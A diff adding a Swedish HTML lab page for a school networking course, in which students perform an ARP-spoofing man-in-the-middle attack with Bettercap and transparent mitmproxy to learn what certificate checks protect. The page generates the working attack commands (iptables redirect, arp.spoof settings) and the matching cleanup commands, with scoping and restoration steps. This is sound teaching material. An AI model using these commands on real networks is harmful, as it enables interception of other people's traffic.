@@ -1,0 +1,643 @@
+<!doctype html>
+<html lang="sv">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Baalstorm — MITM: Krypterat till vem?</title>
+<style>
+:root {
+  --bg:#050b08;
+  --panel:#0a1510;
+  --green:#6cff9a;
+  --yellow:#ffd166;
+  --text:#d7e5dc;
+  --muted:#8ca197;
+  --line:#1f3b2b;
+}
+* { box-sizing:border-box; }
+body {
+  margin:0;
+  background:
+    radial-gradient(circle at 85% 5%,#12332166,transparent 35%),
+    var(--bg);
+  color:var(--text);
+  font:16px/1.65 "Courier New",monospace;
+}
+header {
+  border-bottom:1px solid var(--line);
+  padding:15px 24px;
+  color:var(--green);
+  letter-spacing:.12em;
+}
+main {
+  max-width:1050px;
+  margin:auto;
+  padding:35px 24px 65px;
+}
+h1 {
+  font-size:clamp(2rem,5vw,3.3rem);
+  line-height:1.15;
+  color:#f1fff5;
+}
+h2 {
+  color:var(--green);
+  font-size:1.3rem;
+  border-bottom:1px solid var(--line);
+  padding-bottom:8px;
+  margin-top:36px;
+}
+h3 { color:var(--yellow); }
+a { color:var(--green); }
+.muted { color:var(--muted); }
+.panel {
+  padding:20px;
+  background:var(--panel);
+  border:1px solid var(--line);
+  border-left:4px solid var(--green);
+  margin:20px 0;
+}
+.warn { border-left-color:var(--yellow); }
+.tag {
+  display:inline-block;
+  border:1px solid var(--green);
+  padding:3px 9px;
+  color:var(--green);
+  font-size:.8rem;
+  margin:4px;
+}
+pre {
+  background:#020604;
+  border:1px solid var(--line);
+  padding:16px;
+  overflow:auto;
+  color:var(--green);
+  white-space:pre-wrap;
+  overflow-wrap:anywhere;
+}
+code { color:var(--yellow); }
+table {
+  border-collapse:collapse;
+  width:100%;
+  margin:18px 0;
+}
+td,th {
+  padding:10px;
+  border:1px solid var(--line);
+  text-align:left;
+}
+th { color:var(--green); }
+input,textarea {
+  font:inherit;
+  color:var(--text);
+  background:#07120b;
+  border:1px solid #365442;
+  padding:9px;
+  max-width:100%;
+}
+textarea {
+  width:100%;
+  min-height:85px;
+}
+label {
+  display:block;
+  margin:10px 0;
+}
+.grid {
+  display:grid;
+  grid-template-columns:repeat(2,minmax(0,1fr));
+  gap:12px;
+}
+button {
+  font:inherit;
+  border:1px solid var(--green);
+  background:#102319;
+  color:var(--green);
+  padding:8px 13px;
+  cursor:pointer;
+}
+details {
+  border:1px solid var(--line);
+  padding:14px;
+  margin:12px 0;
+}
+summary {
+  cursor:pointer;
+  color:var(--yellow);
+}
+svg {
+  width:100%;
+  height:auto;
+}
+footer {
+  color:var(--muted);
+  border-top:1px solid var(--line);
+  margin-top:40px;
+  padding-top:20px;
+}
+@media(max-width:650px) {
+  main { padding:24px 14px; }
+  .grid { grid-template-columns:1fr; }
+  table { font-size:.85rem; }
+}
+@media print {
+  body { background:white; color:black; }
+  header,h1,h2,h3,a,.muted { color:black; }
+  pre,.panel,input,textarea,details {
+    background:white;
+    color:black;
+    border-color:#aaa;
+  }
+  button { display:none; }
+  main { max-width:none; }
+}
+</style>
+</head>
+<body>
+<header>BAALSTORM // NETWORK LAB</header>
+
+<main>
+<p style="color:var(--green)">$ ./mitm-lab</p>
+<h1>KRYPTERAT.<br>TILL VEM?</h1>
+
+<p class="muted">
+  ARP → trafikväg → TCP → TLS → HTTP.
+  Undersök en mellanpersonsattack och upptäck vad certifikatkontrollen skyddar.
+</p>
+
+<span class="tag">NÄTVERKSTEKNIK</span>
+<span class="tag">60–90 MIN</span>
+<span class="tag">PARARBETE</span>
+
+<div class="panel">
+  <strong>Efter labben kan du:</strong>
+  skilja destinations-IP från nästa hops MAC-adress,
+  förklara ARP poisoning,
+  skilja kryptering från verifiering av serveridentitet
+  och beskriva varför en ignorerad certifikatvarning
+  inte betyder okrypterad trafik.
+</div>
+
+<div class="panel warn">
+  <strong>Labbmiljö:</strong>
+  läraren tilldelar ett separat IPv4-labbnät och en övningsklient per grupp.
+  Kör mot just den tilldelade klienten.
+  Använd en egen övningssida och påhittade uppgifter.
+  Stäng andra webbsidor på klienten.
+  Ingen CA installeras i klienten under certifikatmomentet.
+</div>
+
+<h2>01 // Vad bygger vi?</h2>
+
+<p>
+  Student A använder övningsklienten.
+  Student B kör Parrot med Bettercap och mitmproxy.
+  Byt roller efter första försöket.
+  En separat labbrouter ger internetåtkomst till den egna
+  originalservern, exempelvis Baalstorm.
+</p>
+
+<svg viewBox="0 0 920 180"
+     role="img"
+     aria-label="Studentens klient ansluter med TLS till Parrots proxy, som ansluter med separat TLS via gatewayen till originalservern">
+  <g fill="#0a1510" stroke="#6cff9a">
+    <rect x="10" y="35" width="190" height="95" rx="8"/>
+    <rect x="350" y="35" width="220" height="95" rx="8"/>
+    <rect x="720" y="35" width="190" height="95" rx="8"/>
+    <path d="M200 80H350M570 80H720"/>
+  </g>
+  <g fill="#d7e5dc"
+     text-anchor="middle"
+     font-size="17"
+     font-family="monospace">
+    <text x="105" y="75">Övningsklient</text>
+    <text x="105" y="105">Webbläsare</text>
+    <text x="460" y="75">Parrot / proxy</text>
+    <text x="460" y="105">Läser klartext</text>
+    <text x="815" y="75">Originalserver</text>
+    <text x="815" y="105">Egen labbsida</text>
+    <text x="275" y="60">TLS 1</text>
+    <text x="645" y="60">TLS 2</text>
+    <text x="645" y="155">Via riktig gateway</text>
+  </g>
+</svg>
+
+<p>
+  Det finns två separata TLS-anslutningar när klienten accepterar
+  mellanhandens certifikat.
+  Proxyn är ändpunkt för båda och kan läsa HTTP-innehållet.
+  ARP poisoning skapar positionen i trafikvägen;
+  det dekrypterar inte TLS.
+</p>
+
+<h2>02 // Förberedelser</h2>
+
+<ul>
+  <li>
+    Parrot och klienten ska finnas i samma Ethernet-segment.
+    En VM använder bryggat nät till labbnätet, inte enbart NAT.
+  </li>
+  <li>
+    Läraren tillhandahåller en egen HTTPS-sida med giltigt certifikat
+    och utan HSTS för det valda namnet.
+    Kontrollera i förväg att webbläsaren tillåter att gå vidare
+    vid certifikatfel.
+  </li>
+  <li>
+    Övningsklienten använder IPv4.
+    Stäng av HTTP/3/QUIC för labbprofilen enligt webbläsarens inställningar.
+    ARP styr inte IPv6, och dessa regler fångar bara TCP.
+  </li>
+  <li>
+    Parrots brandvägg måste tillåta vidarebefordring och klientens
+    anslutning till proxyn på TCP 8080.
+    Stäng inte av hela brandväggen; läraren kontrollerar reglerna.
+  </li>
+</ul>
+
+<p>På Parrot:</p>
+
+<pre>ip -br addr
+ip route
+sudo apt update
+sudo apt install bettercap mitmproxy</pre>
+
+<p>
+  På Windows-klienten: kör <code>ipconfig</code> och <code>arp -a</code>.
+  På Linux: <code>ip route</code> och <code>ip neigh</code>.
+  Besök originalsidans HTTPS-adress direkt.
+  Anteckna gatewayens IP/MAC, certifikatets utfärdare och domännamn.
+</p>
+
+<h2>03 // Fyll i gruppens adresser</h2>
+
+<p>
+  Exempelvärdena måste bytas till lärarens tilldelade labbnät.
+  Sidan genererar kommandon lokalt;
+  den skickar ingen data och kör inga nätverkskommandon.
+</p>
+
+<div class="grid">
+  <label>
+    Parrots nätverkskort<br>
+    <input id="iface" value="eth0">
+  </label>
+  <label>
+    Övningsklientens IPv4<br>
+    <input id="client" value="192.168.50.20">
+  </label>
+  <label>
+    Gatewayens IPv4<br>
+    <input id="gateway" value="192.168.50.1">
+  </label>
+  <label>
+    Originalserverns IPv4<br>
+    <input id="origin" placeholder="Läraren anger serverns IPv4">
+  </label>
+</div>
+
+<button id="generate">Generera labbkommandon</button>
+
+<p id="status" role="status" class="muted">
+  Fyll i originalserverns IPv4 för att visa kommandona.
+</p>
+
+<p>
+  Originalserverns adress kan hämtas med
+  <code>getent ahostsv4 DOMÄNNAMN</code>.
+  Läraren väljer en fungerande IPv4-adress.
+  Om tjänsten använder flera adresser fångar regeln bara den valda adressen.
+  En egen server med stabil IPv4 ger ett mer förutsägbart labbresultat.
+</p>
+
+<h2>04 // Starta transparent HTTPS-proxy</h2>
+
+<p>
+  Kör följande i <strong>terminal A</strong>.
+  De tre ursprungliga sysctl-värdena sparas i variabler för återställningen.
+  Behåll terminalen öppen.
+</p>
+
+<pre id="setup">Kommandon visas efter att adresserna har fyllts i.</pre>
+
+<p>Starta i <strong>terminal B</strong>:</p>
+
+<pre>mitmproxy --mode transparent --showhost --listen-port 8080</pre>
+
+<p>
+  Proxyn måste vara igång innan trafiken omdirigeras genom ARP-momentet.
+  Installera inte mitmproxys CA på övningsklienten:
+  labben ska visa att klienten inte litar på den.
+</p>
+
+<h2>05 // Lura klienten om gatewayens MAC</h2>
+
+<p>Öppna <strong>terminal C</strong>:</p>
+
+<pre id="betterstart">Kommandon visas efter konfigurering.</pre>
+
+<p>Skriv i Bettercaps egen prompt:</p>
+
+<pre id="better">Kommandon visas efter konfigurering.</pre>
+
+<p>
+  <code>targets</code> väljer en enda klient.
+  <code>spoofed</code> anger gatewayens identitet.
+  Full duplex påverkar också gatewayens koppling till klienten.
+  Forwarding sköts manuellt i terminal A.
+  Standardmålet i Bettercap är annars hela subnätet:
+  starta aldrig modulen innan mål har angetts.
+</p>
+
+<h3>Kontrollpunkt A</h3>
+
+<p>
+  Kör <code>arp -a</code> eller <code>ip neigh</code> på klienten igen.
+  Gatewayens IP bör nu ha Parrots MAC-adress.
+  Destinations-IP i paketet mot originalservern
+  är fortfarande originalserverns IP.
+</p>
+
+<h2>06 // Undersök varningen — sedan innehållet</h2>
+
+<ol>
+  <li>
+    Öppna samma HTTPS-adress i en ny anslutning från klienten.
+    Adressfältet visar fortfarande originalets domännamn.
+  </li>
+  <li>
+    Undersök varningen.
+    Anteckna certifikatets utfärdare och varför det inte är betrott.
+    Avbryt först: syns något dekrypterat HTTP-innehåll i proxyn?
+  </li>
+  <li>
+    Gör ett nytt försök.
+    Om webbläsaren erbjuder möjligheten,
+    välj att gå vidare för denna övningssida.
+  </li>
+  <li>
+    I mitmproxy: välj sidans förfrågan, tryck Enter
+    och undersök request och response.
+    Leta upp sökväg, HTTP-metod och en mening ur sidans innehåll.
+  </li>
+  <li>
+    Visa sidans certifikat igen.
+    Jämför med originalcertifikatet från steg 02.
+  </li>
+</ol>
+
+<div class="panel">
+  <strong>Upptäckten:</strong>
+  klientens trafik till proxyn är krypterad.
+  Proxyns trafik till originalservern är också krypterad.
+  HTTP-innehållet är läsbart inne i proxyn
+  eftersom den avslutar TLS-anslutningarna.
+</div>
+
+<p>
+  ARP-poisoning påverkar klientens trafikväg till gatewayen.
+  Proxyregeln begränsar TLS-interceptionen till den angivna klienten
+  och originalserverns IPv4 på TCP 443.
+</p>
+
+<h2>07 // Dokumentera och förklara</h2>
+
+<label>
+  1. Gatewayens IP och MAC före och under attacken.
+  <textarea></textarea>
+</label>
+
+<label>
+  2. Vilken destinations-IP och vilken destinations-MAC använder klienten
+  mot originalservern? Varför skiljer de sig?
+  <textarea></textarea>
+</label>
+
+<label>
+  3. Vilka parter är ändpunkter för TLS 1 respektive TLS 2?
+  <textarea></textarea>
+</label>
+
+<label>
+  4. Vad kunde proxyn läsa när du accepterade certifikatet?
+  Ge ett konkret exempel från övningssidan.
+  <textarea></textarea>
+</label>
+
+<label>
+  5. Bemöt påståendet:
+  ”Om jag ignorerar certifikatvarningen blir trafiken okrypterad.”
+  <textarea></textarea>
+</label>
+
+<label>
+  6. Varför räcker ARP poisoning inte för att läsa HTTPS?
+  <textarea></textarea>
+</label>
+
+<p class="muted">
+  Anteckningar sparas inte automatiskt.
+  Kopiera till inlämningen eller skriv ut sidan till PDF innan du stänger den.
+</p>
+
+<button onclick="window.print()">Skriv ut / spara PDF</button>
+
+<details>
+  <summary>Resonemang att jämföra med efter labben</summary>
+  <p>
+    IP-destinationen är originalservern.
+    För en extern server är nästa hop normalt gatewayen,
+    men ARP-poisoningen gör att ramen skickas till Parrots MAC.
+    TLS 1 går från klient till proxy,
+    TLS 2 från proxy till originalserver.
+    Varningen innebär att certifikatkontrollen har misslyckats,
+    inte att krypteringen har upphört.
+    Ett giltigt certifikat för en phishingdomän kan däremot
+    ge en varningsfri anslutning till just den domänen;
+    därför behöver användaren också kontrollera adressen.
+  </p>
+</details>
+
+<h2>08 // Återställ och verifiera</h2>
+
+<p>
+  I Bettercap, stoppa först spoofingen
+  så att normala ARP-kopplingar kan återställas:
+</p>
+
+<pre>arp.spoof off
+quit</pre>
+
+<p>I <strong>samma terminal A</strong> som tidigare:</p>
+
+<pre id="cleanup">Återställningskommandon visas efter konfigurering.</pre>
+
+<p>
+  Avsluta mitmproxy i terminal B.
+  Återställ övningsklientens IPv6/QUIC-inställningar.
+  Kontrollera gatewayens riktiga MAC
+  och att originalsidans vanliga certifikat åter visas.
+  Vid kvarstående ARP-post kan läraren rensa just gatewayposten
+  eller återansluta klienten till labbnätet.
+  Ta endast bort labbens regel, inte hela brandväggens regelverk.
+</p>
+
+<h2>09 // Om resultatet skiljer sig</h2>
+
+<table>
+  <tr>
+    <th>Symtom</th>
+    <th>Kontrollera</th>
+  </tr>
+  <tr>
+    <td>Gatewayens MAC ändras inte</td>
+    <td>
+      Samma nätsegment, bryggat VM-nät, rätt interface,
+      klientisolering och Dynamic ARP Inspection.
+      Skydd som stoppar attacken är ett relevant labbresultat.
+    </td>
+  </tr>
+  <tr>
+    <td>Klienten tappar nätet</td>
+    <td>
+      Forwarding, full duplex, gatewayadress och Parrots FORWARD-regler.
+      Stoppa spoofingen medan ni felsöker.
+    </td>
+  </tr>
+  <tr>
+    <td>Sidan öppnas utan varning</td>
+    <td>
+      IPv6, QUIC, redan öppen anslutning, fel original-IP
+      eller redan betrodd proxy-CA.
+      Testa med en ren övningsprofil.
+    </td>
+  </tr>
+  <tr>
+    <td>Varningen kan inte kringgås</td>
+    <td>
+      HSTS eller webbläsarpolicy.
+      Använd lärarens förtestade övningsdomän.
+      Att klienten blockerar är ett fungerande skydd;
+      kringgå inte policyn.
+    </td>
+  </tr>
+  <tr>
+    <td>Proxyn visar TLS-fel efter avbrytande</td>
+    <td>
+      Förväntat när klienten avvisar certifikatet.
+      Det betyder inte att HTTP-innehållet har dekrypterats.
+    </td>
+  </tr>
+</table>
+
+<details>
+  <summary>Läraranteckningar och kurskoppling</summary>
+  <p>
+    Passar efter ARP, routing och TCP,
+    i momentet HTTP/HTTPS och applikationsprotokoll.
+    TLS är säkerhetslagret för HTTP här;
+    ARP ligger i den lokala länken.
+    Avsätt 15 minuter för begrepp,
+    35–50 för labb och 10–15 för redovisning.
+  </p>
+  <p>
+    Förtesta med en klient, ett interface och en egen domän utan HSTS.
+    Alla grupper behöver separata nätsegment
+    eller tydligt tilldelade klienter utan konkurrerande spoofing.
+    Den här filen är instruktionen och kan publiceras på GitHub Pages;
+    själva attacken och proxyn körs lokalt.
+    Kommandona är en dokumentationsbaserad mall,
+    inte verifierade i just skolans nät.
+    Gör inte Juice Shops publika GitHub-domän
+    till förstahandsmål för certifikatmomentet.
+  </p>
+  <p>
+    Bedöm studentens förklaring och observationer,
+    inte bara om verktygen lyckades.
+    Ett blockerat angrepp kan ge lika bra diskussion
+    om nätverksskydd och serverautentisering.
+  </p>
+</details>
+
+<footer>
+  BAALSTORM // Källor:
+  <a href="https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/">
+    Bettercap: arp.spoof
+  </a> ·
+  <a href="https://docs.mitmproxy.org/stable/howto/transparent/">
+    mitmproxy: transparent proxy
+  </a> ·
+  <a href="https://docs.mitmproxy.org/stable/concepts/how-mitmproxy-works/">
+    Så fungerar mitmproxy
+  </a>
+  <br>Övningsmall · 2026-10-03
+</footer>
+</main>
+
+<script>
+const $ = id => document.getElementById(id);
+
+function ipv4(s) {
+  const p = s.split(".");
+  return p.length === 4 &&
+    p.every(x => /^\d{1,3}$/.test(x) && Number(x) <= 255);
+}
+
+$("generate").addEventListener("click", () => {
+  const i = $("iface").value.trim();
+  const c = $("client").value.trim();
+  const g = $("gateway").value.trim();
+  const o = $("origin").value.trim();
+
+  if (
+    !/^[a-zA-Z0-9_.:-]+$/.test(i) ||
+    ![c, g, o].every(ipv4) ||
+    c === g
+  ) {
+    $("status").textContent =
+      "Ange giltigt interface och separata IPv4-adresser för klient och gateway.";
+    return;
+  }
+
+  $("setup").textContent =
+`LAB_IFACE='${i}'
+LAB_CLIENT='${c}'
+LAB_ORIGIN='${o}'
+LAB_OLD_FORWARD=$(sysctl -n net.ipv4.ip_forward)
+LAB_OLD_REDIRECT_ALL=$(sysctl -n net.ipv4.conf.all.send_redirects)
+LAB_OLD_REDIRECT_IF=$(sysctl -n "net.ipv4.conf.$LAB_IFACE.send_redirects")
+
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo sysctl -w net.ipv4.conf.all.send_redirects=0
+sudo sysctl -w "net.ipv4.conf.$LAB_IFACE.send_redirects=0"
+
+sudo iptables -t nat -A PREROUTING -i "$LAB_IFACE" \\
+  -s "$LAB_CLIENT" -d "$LAB_ORIGIN" -p tcp --dport 443 \\
+  -m comment --comment baalstorm-mitm-lab \\
+  -j REDIRECT --to-ports 8080`;
+
+  $("betterstart").textContent = `sudo bettercap -iface ${i}`;
+
+  $("better").textContent =
+`set arp.spoof.targets ${c}
+set arp.spoof.spoofed ${g}
+set arp.spoof.fullduplex true
+set arp.spoof.forwarding false
+set arp.spoof.skip_restore false
+arp.spoof on`;
+
+  $("cleanup").textContent =
+`sudo iptables -t nat -D PREROUTING -i "$LAB_IFACE" \\
+  -s "$LAB_CLIENT" -d "$LAB_ORIGIN" -p tcp --dport 443 \\
+  -m comment --comment baalstorm-mitm-lab \\
+  -j REDIRECT --to-ports 8080
+
+sudo sysctl -w "net.ipv4.ip_forward=$LAB_OLD_FORWARD"
+sudo sysctl -w "net.ipv4.conf.all.send_redirects=$LAB_OLD_REDIRECT_ALL"
+sudo sysctl -w "net.ipv4.conf.$LAB_IFACE.send_redirects=$LAB_OLD_REDIRECT_IF"`;
+
+  $("status").textContent =
+    "Kommandon genererade. Behåll terminal A öppen tills återställningen är klar.";
+});
+</script>
+</body>
+</html>
